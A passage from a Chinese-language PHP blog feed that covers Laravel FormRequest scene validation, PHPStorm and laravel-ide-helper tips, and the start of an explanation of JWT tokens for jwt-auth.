class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">FormRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Exceptions</span>\<span class="title">HttpResponseException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class BaseRequest</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Requests</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseRequest</span> <span class="keyword">extends</span> <span class="title">FormRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ApiResponse</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $scene = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否自动验证</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $autoValidate = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $onlyRule=[];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> \Illuminate\Auth\Access\AuthorizationException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateResolved</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="string">'autoValidate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoValidate = <span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'autoValidate'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoValidate) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handleValidate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> \Illuminate\Auth\Access\AuthorizationException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleValidate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prepareForValidation();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;passesAuthorization()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failedAuthorization();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;getValidatorInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance-&gt;fails()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failedValidation($instance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义 getValidatorInstance 下 validator 验证器</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $factory</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validator</span><span class="params">($factory)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $factory-&gt;make(<span class="keyword">$this</span>-&gt;validationData(), <span class="keyword">$this</span>-&gt;getRules(), <span class="keyword">$this</span>-&gt;messages(), <span class="keyword">$this</span>-&gt;attributes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证方法（关闭自动验证时控制器调用）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $scene  场景名称 或 验证规则</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">($scene = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autoValidate) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($scene)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;onlyRule = $scene;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;scene = $scene;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handleValidate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取 rules</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleScene(<span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'rules'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 场景验证</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $rule</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleScene</span><span class="params">(array $rule)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;onlyRule) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleRule(<span class="keyword">$this</span>-&gt;onlyRule, $rule);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sceneName = <span class="keyword">$this</span>-&gt;getSceneName();</span><br><span class="line">        <span class="keyword">if</span> ($sceneName &amp;&amp; method_exists(<span class="keyword">$this</span>, <span class="string">'scene'</span>)) &#123;</span><br><span class="line">            $scene = <span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'scene'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists($sceneName, $scene)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleRule($scene[$sceneName], $rule);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  $rule;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理Rule</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $sceneRule</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $rule</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRule</span><span class="params">(array $sceneRule, array $rule)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rules = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($sceneRule <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key) &amp;&amp; array_key_exists($value, $rule)) &#123;</span><br><span class="line">                $rules[$value] = $rule[$value];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $rules[$key] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $rules;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取场景名称</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getSceneName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null(<span class="keyword">$this</span>-&gt;scene) ? <span class="keyword">$this</span>-&gt;route()-&gt;getAction(<span class="string">'_scene'</span>) : <span class="keyword">$this</span>-&gt;scene;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过重写 failedValidation，方便Request 类抛出异常</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Validator $validator</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">failedValidation</span><span class="params">(Validator $validator)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpResponseException(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failed($validator-&gt;errors()-&gt;first())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>ApiResponse</code> 是一个封装了返回客户端内容的 Trait。</p><h2 id="添加路由场景方法"><a href="#添加路由场景方法" class="headerlink" title="添加路由场景方法"></a>添加路由场景方法</h2><p>然后在 <code>app\Providers\AppServiceProvider.php</code> 类中的 <code>boot()</code> 方法中添加场景方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 添加场景验证 scene 方法</span></span><br><span class="line">        Route::macro(<span class="string">'scene'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($scene = null)</span> </span>&#123;</span><br><span class="line">            $action = Route::getAction();</span><br><span class="line">            $action[<span class="string">'_scene'</span>] = $scene;</span><br><span class="line">            Route::setAction($action);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用路由场景方法"><a href="#使用路由场景方法" class="headerlink" title="使用路由场景方法"></a>使用路由场景方法</h2><p>该自定义方法用于路由场景验证，在 <code>Route-&gt;action</code> 增加一个 <code>_scene</code> 属性。其实用法和路由别名函数是一样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::post(<span class="string">'add'</span>,<span class="string">'UserController@add'</span>)-&gt;scene(<span class="string">'add'</span>);</span><br></pre></td></tr></table></figure><h2 id="路由场景验证"><a href="#路由场景验证" class="headerlink" title="路由场景验证"></a>路由场景验证</h2><p><code>UserRequest</code> 使用示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">BaseRequest</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRequest</span> <span class="keyword">extends</span> <span class="title">BaseRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation rules that apply to the request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 定义验证规则</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'required|string|unique:users'</span>,</span><br><span class="line">            <span class="string">'email'</span> =&gt; <span class="string">'required|email|unique:users'</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 场景规则</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scene</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 格式  ['场景名' =&gt; [规则]]</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">             <span class="comment">// add 场景</span></span><br><span class="line">            <span class="string">'add'</span> =&gt; [</span><br><span class="line">                <span class="string">'name'</span>,                          <span class="comment">// 复用 rules() 下 name 规则</span></span><br><span class="line">                <span class="string">'email'</span> =&gt; <span class="string">'email|unique:users'</span>  <span class="comment">// 重置规则</span></span><br><span class="line">            ],</span><br><span class="line">             <span class="comment">// edit场景</span></span><br><span class="line">            <span class="string">'edit'</span> =&gt; [<span class="string">'name'</span>],</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>scene()</code> 方法中的场景，不是控制器的方法名称，而是需要通过路由去自定义，可以使任意合法的名称，不一定要与控制器方法名保持一致。</p><p>至此就完成了上面提到的三个需求，使用起来也比较简单，没有破坏框架原本用法。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/38825#863a85" target="_blank" rel="noopener">Laravel 验证类 实现 路由场景验证 和 控制器场景验证</a></li><li><a href="https://learnku.com/laravel/t/31215" target="_blank" rel="noopener">修改 Laravel FormRequest 验证，实现场景验证</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Laravel 中，有很多方法可以验证传入的数据，对于表单请求，通常主要有两种方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在控制器中使用&lt;code&gt;ValidatesRequests&lt;/code&gt; 的 &lt;code&gt;validate()&lt;/code&gt;方法&lt;/li&gt;
&lt;li&gt;创建表单验证类&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>PHPStorm 使用技巧整理</title>
    <link href="https://www.0x2beace.com/phpstorm-use-skills-finishing/"/>
    <id>https://www.0x2beace.com/phpstorm-use-skills-finishing/</id>
    <published>2021-06-07T15:28:42.000Z</published>
    <updated>2021-06-07T15:31:48.602Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理 PHPStorm 的一些使用技巧。</p><a id="more"></a><h2 id="类型提示"><a href="#类型提示" class="headerlink" title="类型提示"></a>类型提示</h2><p>在使用IDE 开发的过程中，不知你是否有注意到这样一个问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">article</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hasMany(User::class)-&gt;where(<span class="function"><span class="keyword">function</span><span class="params">($query)</span></span>&#123;</span><br><span class="line">        $query-&gt;where(<span class="string">'open'</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用<code>$query</code> 调用 <code>where</code> 方法时，默认是没有提示的，这是为什么呢？</p><p>这是因为PHP 语言特性的原因，一个数组可以存放各种类型的值，无法从外部知道里面的值具体是什么类型，这就导致IDE 无法给出有效的提示了。</p><p>其实这时我们只需要显示的告诉IDE，这个变量具体是什么类型的，编译器就能正常提示了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605113822.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@var</span> Collection $collection */</span></span><br></pre></td></tr></table></figure><h2 id="IDE-Helper"><a href="#IDE-Helper" class="headerlink" title="IDE Helper"></a>IDE Helper</h2><p><a href="https://github.com/barryvdh/laravel-ide-helper#laravel-ide-helper-generator" target="_blank" rel="noopener">Laravel IDE Helper</a> 是一个代码提示及补全工具。</p><p>只在开发环境中安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev barryvdh/laravel-ide-helper</span><br></pre></td></tr></table></figure><p>对于只在开发环境中需要安装的扩展包，在 app/Providers/AppServiceProvider.php 文件中以如下方式进行注册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;app-&gt;environment() !== <span class="string">'production'</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为-Facades-生成注释"><a href="#为-Facades-生成注释" class="headerlink" title="为 Facades 生成注释"></a>为 Facades 生成注释</h3><p>运行一下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>_ide_helper.php</code> 文件。</p><h3 id="为模型生成注解"><a href="#为模型生成注解" class="headerlink" title="为模型生成注解"></a>为模型生成注解</h3><p>使用Laravel 为我们提供的 <code>make:model</code> 默认不会为在模型文件中，生成相应的注解。</p><p>当我们需要通过对象获取模型的某个属性时，IDE 这时会提示未定义的属性，虽然不会影响功能的使用，但是对于开发人员来说并不友好。</p><p>看起来就像这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605110602.png" alt=""></p><p>使用<code>IDE Helper</code> 来生成模型注解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:models "App\Models\UserModel"</span><br><span class="line"></span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No):  (yes/no) [no]:</span><br></pre></td></tr></table></figure><p>建议选择『yes』，否则会生成「_ide_helper_models.php」文件，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件。</p><p>如果希望为所有模型都加上注解，则省略后面的参数。</p><p>看起来好多了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605111205.png" alt=""></p><blockquote><p>注意： 为模型生成字段信息必须在数据库中存在相应的数据表。</p></blockquote><h3 id="自动为链式操作注释"><a href="#自动为链式操作注释" class="headerlink" title="自动为链式操作注释"></a>自动为链式操作注释</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:meta</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>.phpStorm.meta.php</code> 文件。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理 PHPStorm 的一些使用技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="PHPStorm" scheme="https://www.0x2beace.com/categories/PHP/PHPStorm/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHPStorm" scheme="https://www.0x2beace.com/tags/PHPStorm/"/>
    
  </entry>
  
  <entry>
    <title>Laravel jwt-auth 使用详解</title>
    <link href="https://www.0x2beace.com/laravel-jwt-auth-use-detailed-explanation/"/>
    <id>https://www.0x2beace.com/laravel-jwt-auth-use-detailed-explanation/</id>
    <published>2021-06-06T09:11:15.000Z</published>
    <updated>2021-06-06T14:25:11.046Z</updated>
    
    <content type="html"><![CDATA[<p>通常后端在开发Api 应用时，会给客户端一个唯一Token 进行标示，获取Token 的方式有很多，这里以 JWT 为例，介绍其概念及使用方法。</p><a id="more"></a><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">JWT</a> 是 <code>JSON Web Token</code> 的缩写，是一个非常轻巧的规范，这个规范允许我们使用 JWT 在用户和服务器之间传递安全可靠的信息。</p><p>JWT 由头部（header）、载荷（payload）与签名（signature）组成，一个 JWT 类似下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;,</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;iss&quot;:&quot;http:&#x2F;&#x2F;larabbs.test&quot;,</span><br><span class="line">    &quot;iat&quot;:1515733500,</span><br><span class="line">    &quot;exp&quot;:1515737100,</span><br><span class="line">    &quot;nbf&quot;:1515733500,</span><br><span class="line">    &quot;jti&quot;:&quot;c3U4VevxG2ZA1qhT&quot;,</span><br><span class="line">    &quot;sub&quot;:1,</span><br><span class="line">    &quot;prv&quot;:&quot;23bd5c8949f600adb39e701c400872db7a5976f7&quot;</span><br><span class="line">&#125;</span><br><span class="line">signature</span><br></pre></td></tr></table></figure><ul><li>头部声明了加密算法；</li><li>载荷中有两个比较重要的数据，exp 是过期时间，sub 是 JWT 的主体，这里就是用户的 id；</li><li>最后的 signature 是由服务器生成的签名，保证了 token 不被篡改。</li></ul><p>这三部分是分别用 <code>base64url</code> 进行编码，然后通过<code>.</code> 符号组合在一起，最后得到的token 大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx.yyyyyy.zzzzzz</span><br></pre></td></tr></table></figure><p>x、y、z 部分分别代表了各自部位对应的信息。</p><blockquote><p>注意⚠️：JWT 最后是通过 Base64 编码的，也就是说，它可以被翻译回原来的样子来的。所以不要在 JWT 中存放一些敏感信息。</p></blockquote><h3 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h3><p>Token 既然会下发给客户端，那为什么不用保存一份在服务端？</p><p>这是因为，唯一的签名保存在服务端，所以无需担心Token 中的信息可能被篡改，清楚这一点之后，只需要验证Token 的合法性。</p><h3 id="Token-验证"><a href="#Token-验证" class="headerlink" title="Token 验证"></a>Token 验证</h3><p>有了 token 之后该如何验证 token 的有效性，并得到 token 对应的用户呢？</p><p>Laravel 为我们准备好了 <code>auth</code> 这个中间件：</p><ul><li>获取客户端提交的 token</li><li>检测 token 中的签名 signature 是否正确</li><li>判断 payload 数据中的 exp，是否已经过期</li><li>根据 payload 数据中的 sub（用户 ID），取数据库中验证用户是否存在</li><li>上述检测不正确，则抛出相应异常</li></ul><p>并且幸运的是，一些勤劳的人，已经帮我们完成了这部分工作。</p><h2 id="jwt-auth"><a href="#jwt-auth" class="headerlink" title="jwt-auth"></a>jwt-auth</h2><p><a 